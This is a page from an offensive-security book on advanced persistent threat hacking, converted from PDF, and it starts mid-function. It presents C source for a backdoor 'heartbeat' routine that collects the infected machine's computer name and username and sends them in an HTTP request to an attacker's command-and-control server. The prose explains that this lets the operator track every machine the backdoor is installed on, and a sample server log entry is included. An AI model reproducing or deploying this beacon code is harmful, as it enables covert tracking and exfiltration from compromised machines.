<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1a9" class="pf w2 h2" data-page-no="1a9"><div class="pc pc1a9 w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">402<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h40 ya7f fff fs5 fc0 sc0 ls0 ws0">  memset(hostName, ‘\0’, sizeof(hostName));</div><div class="t m0 x3 h40 ya80 fff fs5 fc0 sc0 ls0 ws0">  memset(userName, ‘\0’, sizeof(userName));</div><div class="t m0 x3 h40 y2615 fff fs5 fc0 sc0 ls0 ws0">  GetEnvironmentVariable( "COMPUTERNAME", hostName, sizeof(hostName));</div><div class="t m0 x3 h40 y2616 fff fs5 fc0 sc0 ls0 ws0">  GetEnvironmentVariable( "USERNAME", userName, sizeof(userName));</div><div class="t m0 x3 h40 y2617 fff fs5 fc0 sc0 ls0 ws0">  char finalURL[512];</div><div class="t m0 x3 h40 y2618 fff fs5 fc0 sc0 ls0 ws0">  memset(finalURL, ‘\0’, sizeof(finalURL));</div><div class="t m0 x3 h40 y2619 fff fs5 fc0 sc0 ls0 ws0">/* assemble url to request based on defines */</div><div class="t m0 x3 h40 y18fc fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, PROTO);</div><div class="t m0 x3 h40 y261a fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, "://");</div><div class="t m0 x3 h40 y261b fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, WEBSITE);</div><div class="t m0 x3 h40 y261c fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, "/heartbeat.php?comp=");</div><div class="t m0 x3 h40 y261d fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, hostName);</div><div class="t m0 x3 h40 y261e fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, "&amp;user=");</div><div class="t m0 x3 h40 y261f fff fs5 fc0 sc0 ls0 ws0"> strcat( finalURL, userName);</div><div class="t m0 x3 h40 y2620 fff fs5 fc0 sc0 ls0 ws0">  curl = curl_easy_init();</div><div class="t m0 x3 h40 y2621 fff fs5 fc0 sc0 ls0 ws0">  if(curl) {</div><div class="t m0 x3 h40 y2622 fff fs5 fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_URL, finalURL );</div><div class="t m0 x3 h40 y2623 fff fs5 fc0 sc0 ls0 ws0">    res = curl_easy_perform(curl);</div><div class="t m0 x3 h40 y2624 fff fs5 fc0 sc0 ls0 ws0">    if ( res == 0 )</div><div class="t m0 x3 h40 y2625 fff fs5 fc0 sc0 ls0 ws0">    {</div><div class="t m0 x3 h40 y2626 fff fs5 fc0 sc0 ls0 ws0">       curl_easy_cleanup(curl);</div><div class="t m0 x3 h40 y2627 fff fs5 fc0 sc0 ls0 ws0">       printf("success!!\n");</div><div class="t m0 x3 h40 y2628 fff fs5 fc0 sc0 ls0 ws0">       return 0;</div><div class="t m0 x3 h40 y2629 fff fs5 fc0 sc0 ls0 ws0">    }</div><div class="t m0 x3 h40 y262a fff fs5 fc0 sc0 ls0 ws0">    else</div><div class="t m0 x3 h40 y262b fff fs5 fc0 sc0 ls0 ws0">        return 1;</div><div class="t m0 x3 h40 y262c fff fs5 fc0 sc0 ls0 ws0">  }</div><div class="t m0 x3 h40 y262d fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y262e ff4 fs7 fc0 sc0 ls0 ws0">In this example of the backdoorHeartbeat function, you can see that all we’<span class="_ _2"/>re </div><div class="t m0 x3 hd y262f ff4 fs7 fc0 sc0 ls0 ws0">doing is building an HTTP GET request, which includes the computer name and </div><div class="t m0 x3 hd y2630 ff4 fs7 fc0 sc0 ls0 ws0">username, and then sending the GET request. This allo<span class="_ _0"/>ws us to track indi<span class="_ _0"/>vidual </div><div class="t m0 x3 hd y2631 ff4 fs7 fc0 sc0 ls0 ws0">machines that the backdoor is installed on. In this case, e<span class="_ _0"/>verything is included in </div><div class="t m0 x3 hd y2632 ff4 fs7 fc0 sc0 ls0 ws0">cleartext in the request. <span class="_ _0"/>Thus, if the network were being monitored, it would be easy </div><div class="t m0 x3 hd y2633 ff4 fs7 fc0 sc0 ls0 ws0">for someone to see what the backdoor is sending. <span class="_ _0"/>W<span class="_ _3"/>e’ll cover mangling the data in a </div><div class="t m0 x3 hd y2634 ff4 fs7 fc0 sc0 ls0 ws0">separate section.</div><div class="t m0 x4 hd y2635 ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e do not even need to create the requested le on the C2 serv<span class="_ _0"/>er—in this case, </div><div class="t m0 x3 hd y2636 ff4 fs7 fc0 sc0 ls0 ws0">heartbeat.php. <span class="_ _3"/>Y<span class="_ _3"/>ou’ll see an entry in the web serv<span class="_ _0"/>er log les ev<span class="_ _0"/>en if the le does not </div><div class="t m0 x3 hd y2637 ff4 fs7 fc0 sc0 ls0 ws0">exist, lik<span class="_ _0"/>e the following e<span class="_ _0"/>xample of the log entry on an <span class="_ _2"/>Apache web server:</div><div class="t m0 x3 h40 y2638 fff fs5 fc0 sc0 ls0 ws0">10.0.0.100 - - [08/Jun/2014:16:12:43 -0400] "GET /heartbeat.</div><div class="t m0 x3 h40 y2639 fff fs5 fc0 sc0 ls0 ws0">php?comp=WeakBox&amp;user=jsmith HTTP/1.1" 404 828 "-" "-"</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>